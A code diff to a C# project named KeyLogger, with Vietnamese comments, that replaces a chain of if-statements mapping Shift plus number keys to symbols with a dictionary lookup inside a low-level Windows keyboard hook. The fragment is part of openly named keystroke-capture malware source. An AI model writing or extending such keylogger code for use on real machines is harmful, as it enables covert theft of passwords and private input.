@@ -1,8 +1,8 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Windows.Forms;
 
 namespace KeyLogger
@@ -45,9 +45,15 @@ namespace KeyLogger
 
         // ==================== CONSTANTS ====================
 
-        // Hằng số định nghĩa Hook bàn phím mức thấp
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        
+        // Mapping phím số khi giữ Shift
+        private static readonly Dictionary<string, string> ShiftNumberMap = new Dictionary<string, string>
+        {
+            {"1", "!"}, {"2", "@"}, {"3", "#"}, {"4", "$"}, {"5", "%"},
+            {"6", "^"}, {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"}
+        };
 
         // ==================== FIELDS ====================
 
@@ -105,19 +111,8 @@ namespace KeyLogger
                 else if (key >= Keys.D0 && key <= Keys.D9)
                 {
                     string s = key.ToString().Replace("D", "");
-                    if (isShift)
-                    {
-                        // Map thủ công các ký tự trên phím số
-                        if (s == "1") s = "!";
-                        else if (s == "2") s = "@";
-                        else if (s == "3") s = "#";
-                        else if (s == "4") s = "$";
-                        else if (s == "5") s = "%";
-                        else if (s == "6") s = "^";
-                        else if (s == "7") s = "&";
-                        else if (s == "8") s = "*";
-                        else if (s == "9") s = "("; else if (s == "0") s = ")";
-                    }
+                    if (isShift && ShiftNumberMap.ContainsKey(s))
+                        s = ShiftNumberMap[s];
                     output = s;
                 }
                 // 3. Xử lý bàn phím số bên phải (Numpad)
